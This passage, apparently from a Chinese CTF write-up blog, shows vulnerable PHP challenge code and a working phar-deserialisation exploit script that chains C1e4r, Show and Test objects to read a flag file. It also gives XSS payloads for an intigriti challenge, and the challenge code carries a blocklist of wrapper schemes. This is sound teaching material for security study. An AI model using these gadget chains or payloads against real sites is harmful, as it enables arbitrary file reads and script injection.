punctuation">,</span><span class="token string">"png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token comment" spellcheck="true">//echo "&lt;h4>请选择上传的文件:" . "&lt;h4/>"; </span>    <span class="token punctuation">}</span>     <span class="token keyword">else</span><span class="token punctuation">{</span>         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">,</span><span class="token variable">$allowed_types</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>             <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token keyword">else</span> <span class="token punctuation">{</span>             <span class="token keyword">echo</span> <span class="token string">'&lt;script type="text/javascript">alert("Invalid file!");&lt;/script>'</span><span class="token punctuation">;</span>             <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="class-php"><a href="#class-php" class="headerlink" title="class.php"></a>class.php</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//class.php</span><span class="token keyword">class</span> <span class="token class-name">C1e4r</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//$this->source = phar://phar.jpg</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string">'str'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__set</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/http|https|file:|gopher|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"hacker~"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$text</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="base-php"><a href="#base-php" class="headerlink" title="base.php"></a>base.php</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//base.php</span>    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span> <span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>     <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>     <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>web3<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span>     <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>     <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>     <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>     <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>nav</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>navbar navbar-default<span class="token punctuation">"</span></span> <span class="token attr-name">role</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>navigation<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>         <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>container-fluid<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>         <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>navbar-header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>             <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>navbar-brand<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>index.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>首页<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>         <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>             <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>nav navbar-nav navbra-toggle<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>                 <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>active<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file.php?file<span class="token punctuation">=</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>查看文件<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>                 <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>upload_file.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>上传文件<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>             <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span></span>             <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>nav navbar-nav navbar-right<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>                 <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>index.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>glyphicon glyphicon-user<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>             <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span></span>         <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>     <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>nav</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token comment" spellcheck="true">&lt;!--flag is in f1ag.php--></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="11-2-思路"><a href="#11-2-思路" class="headerlink" title="11.2  思路"></a>11.2  思路</h2><p>程序结束时C1e4r类会调用destruct，利用echo输出类来调用Show类的toString，利用没有source成员变量的特性，调用Test类的get，进行任意文件读取。</p><p>需要注意的是路径要为绝对路径，魔术函数__GET得到键值的方式。</p><p>另一种思路：想利用Show的wakeup，本地跟踪发现是可以读到文件数据的，但后面因为$show-&gt;source = $file;<br>$show-&gt;_show(); 猜测是把返回值给覆盖了，最后未出现flag。而解题思路是在程序最后结束时调用destruct的，所以没有存在这个问题。</p><p>exp：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">C1e4r</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// $a->params = array("source"=>'D://flag');</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"source"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'/var/www/html/f1ag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string">'str'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token variable">$c</span>  <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C1e4r</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"18.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//后缀名必须为phar</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设置stub</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将自定义的meta-data存入manifest</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//添加要压缩的文件</span><span class="token comment" spellcheck="true">//签名自动计算</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="12-Simple-Upload"><a href="#12-Simple-Upload" class="headerlink" title="12. Simple Upload"></a>12. Simple Upload</h1><p><strong>链接：</strong></p><p><strong>考点：</strong></p><p><strong>参考资料：</strong></p><h1 id="13-Try-to-alert（XSS）"><a href="#13-Try-to-alert（XSS）" class="headerlink" title="13. Try to alert（XSS）"></a>13. Try to alert（XSS）</h1><p><strong>链接：</strong><a href="https://challenge.intigriti.io/" target="_blank" rel="noopener">https://challenge.intigriti.io/</a></p><p><strong>考点：</strong>XSS</p><p><strong>参考资料：</strong></p><p><strong>1、</strong>writeup1：<a href="https://xz.aliyun.com/t/7655" target="_blank" rel="noopener">https://xz.aliyun.com/t/7655</a></p><p><strong>2、</strong>writeup2：<a href="https://www.secpulse.com/archives/128882.html（不用.htaccess）" target="_blank" rel="noopener">https://www.secpulse.com/archives/128882.html（不用.htaccess）</a></p><p>源代码：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">var</span> hash <span class="token operator">=</span> document<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//hash 属性是一个可读可写的字符串，该字符串是 URL 的锚部分（从 # 号开始的部分）。</span><span class="token comment" spellcheck="true">//location.hash返回当前url的锚部分</span><span class="token comment" spellcheck="true">//.substr(1)取的是#后面的那一部分</span><span class="token keyword">if</span><span class="token punctuation">(</span>hash<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">displayReason</span><span class="token punctuation">(</span>hash<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"reasons"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>onchange <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>value <span class="token operator">!=</span> <span class="token string">""</span><span class="token punctuation">)</span>    <span class="token function">displayReason</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> reasonLoaded <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> reason <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"reason"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    reason<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token function">unescape</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>responseText<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">displayReason</span><span class="token punctuation">(</span>reason<span class="token punctuation">)</span><span class="token punctuation">{</span>  window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash <span class="token operator">=</span> reason<span class="token punctuation">;</span>  <span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  xhr<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"load"</span><span class="token punctuation">,</span> reasonLoaded<span class="token punctuation">)</span><span class="token punctuation">;</span>  xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span><span class="token template-string"><span class="token string">`./reasons/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>reason<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">.txt`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>  xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp：</p><pre class="line-numbers language-javascript"><code class="language-javascript">探测：<span class="token operator">/</span><span class="token punctuation">.</span>htaccess<span class="token operator">?</span>x<span class="token operator">&lt;</span>img src<span class="token operator">=</span># onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">></span>打：<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span>htaccess<span class="token operator">?</span><span class="token operator">%</span>253cimg<span class="token operator">%</span>2520src<span class="token operator">=</span><span class="token operator">%</span><span class="token number">2523</span><span class="token operator">%</span>2520onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span>253e   